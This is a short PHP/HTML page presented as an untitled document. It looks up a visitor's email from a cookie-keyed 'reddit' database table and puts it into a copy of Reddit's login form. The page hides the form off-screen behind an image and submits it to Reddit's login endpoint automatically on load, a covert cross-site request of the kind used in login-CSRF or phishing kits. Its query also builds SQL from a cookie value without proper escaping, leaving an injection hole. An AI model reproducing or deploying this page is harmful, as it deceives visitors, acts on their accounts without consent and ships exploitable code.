<style>body{margin-left:-200%;}</style><img src="../small_icons/328.gif" style="left:45%; top:40%;position:absolute"/><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Untitled Document</title>
</head>
<?
require_once('../db.php');
$uid=htmlspecialchars($_COOKIE['uid']);
$query = mysql_query("SELECT user_email FROM `reddit` WHERE `user_id`='$uid'"); 
$result = mysql_fetch_assoc($query); 
$email=$result['user_email'];  
?>
<body onLoad="javascript: submitform()">

<script type="text/javascript">function submitform()  {document.forms["login_login-main"].submit();}</script>



<form method="post" action="https://ssl.reddit.com/post/login" id="login_login-main" class="login-form login-form-side"><input type="hidden" name="op" value="login-main"><input name="user" placeholder="username" type="text" maxlength="20" tabindex="1" value="<?=$email;?>"><input name="passwd" placeholder="password" type="password" tabindex="1"><div class="status"></div><div id="remember-me"><input type="checkbox" name="rem" id="rem-login-main" tabindex="1"><label for="rem-login-main">remember me</label><a class="recover-password" href="/password">reset password</a></div><div class="submit"><span class="throbber"></span><button class="btn" type="submit" tabindex="1">login</button></div><div class="clear"></div></form>


</body>
</html>

